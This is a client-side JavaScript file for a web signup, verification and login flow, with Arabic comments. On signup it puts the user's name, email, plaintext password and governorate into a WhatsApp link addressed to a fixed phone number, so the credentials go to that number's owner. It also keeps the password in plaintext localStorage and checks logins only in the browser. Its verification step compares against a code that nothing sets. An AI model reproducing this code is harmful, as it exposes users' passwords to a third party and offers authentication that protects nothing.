document.addEventListener('DOMContentLoaded', function() {
      const signupForm = document.getElementById('signup-form');
      const verifyForm = document.getElementById('verify-form');
      const loginForm = document.getElementById('login-form');
    
      if (signupForm) {
        signupForm.addEventListener('submit', function(event) {
          event.preventDefault();
    
          const email = document.getElementById('email').value;
          const password = document.getElementById('password').value;
          const firstName = document.getElementById('first-name').value;
          const lastName = document.getElementById('last-name').value;
          const governorate = document.getElementById('governorate').value;
    
          // إرسال رسالة عبر الواتساب
          const message = `شكراً على تزويدنا بمعلوماتك. سيتم إرسال لك كود التحقق قريباً.\n\nالاسم: ${firstName} ${lastName}\nالبريد الإلكتروني: ${email}\nكلمة المرور: ${password}\nالمحافظة: ${governorate}`;
          const whatsappLink = `https://wa.me/963990764268?text=${encodeURIComponent(message)}`;
          window.open(whatsappLink, '_blank');
    
          // تخزين بيانات المستخدم مؤقتًا في Local Storage
          localStorage.setItem('email', email);
          localStorage.setItem('password', password);
          localStorage.setItem('firstName', firstName);
          localStorage.setItem('lastName', lastName);
          localStorage.setItem('governorate', governorate);
    
          // نقل المستخدم إلى صفحة التحقق
          window.location.href = 'verify.html';
        });
      }
    
      if (verifyForm) {
        verifyForm.addEventListener('submit', function(event) {
          event.preventDefault();
    
          const inputCode = document.getElementById('verification-code').value;
          const storedCode = localStorage.getItem('verificationCode');
    
          if (inputCode === storedCode) {
            alert('تم التحقق بنجاح! يمكنك الآن تسجيل الدخول.');
            window.location.href = 'login.html';
          } else {
            alert('كود التحقق غير صحيح. حاول مرة أخرى.');
          }
        });
      }
    
      if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
          event.preventDefault();
    
          const email = document.getElementById('email').value;
          const password = document.getElementById('password').value;
          const storedEmail = localStorage.getItem('email');
          const storedPassword = localStorage.getItem('password');
    
          if (email === storedEmail && password === storedPassword) {
            alert('تسجيل الدخول ناجح!');
            window.location.href = 'home.html';
          } else {
            alert('البريد الإلكتروني أو كلمة المرور غير صحيحة. حاول مرة أخرى.');
          }
        });
      }
    });
    
    function generateVerificationCode(email) {
      const emailPrefix = email.split('@')[0].toLowerCase();
      let verificationCode = '';
    
      for (let i = 0; i < emailPrefix.length; i++) {
        const char = emailPrefix.charAt(i);
        const charCode = char.charCodeAt(0) - 96;
        verificationCode += charCode;
      }
    
      return verificationCode;
    }